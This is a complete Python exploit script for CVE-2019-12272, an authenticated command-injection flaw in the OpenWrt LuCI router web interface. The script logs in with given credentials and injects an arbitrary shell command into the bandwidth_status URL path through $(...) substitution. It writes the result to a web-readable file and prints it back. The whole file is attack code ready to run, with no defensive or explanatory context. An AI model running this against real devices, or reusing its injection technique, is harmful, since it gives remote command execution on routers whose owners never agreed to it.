#!/usr/bin/python3

import argparse
import json
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(args):
    try:
        address = args.address
        username = args.username
        password = args.password
        command = args.command
    
        session = requests.Session()

        url = 'https://%s/cgi-bin/luci/' % address
        data = {'luci_username':username,'luci_password':password}
        response = session.post(url=url,data=data,verify=False)
        auth = response.request.headers['Cookie'].split('=')

        cookies = {auth[0]:auth[1]}
        url = 'https://%s/cgi-bin/luci/admin/status/realtime/bandwidth_status/eth0$(%s>cmd)' % ( address,command )
        response = session.get(url=url,cookies=cookies,verify=False)
        url = 'https://%s/cmd' % address
        response = session.get(url=url,cookies=cookies,verify=False)
        print('[+] out='+str(response.content))
    except:
        print('[-] not exploitable')


def main():
    parser = argparse.ArgumentParser(description='cve-2019-12272.py')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument('-a', '--address', help='Luci host address', required=True)
    requiredNamed.add_argument('-u', '--username', help='Luci username', required=True)
    requiredNamed.add_argument('-p', '--password', help='Luci password', required=True)
    requiredNamed.add_argument('-c', '--command', help='Command to inject', required=True)
    args = parser.parse_args()
    exploit(args)

if __name__== "__main__":
    main()
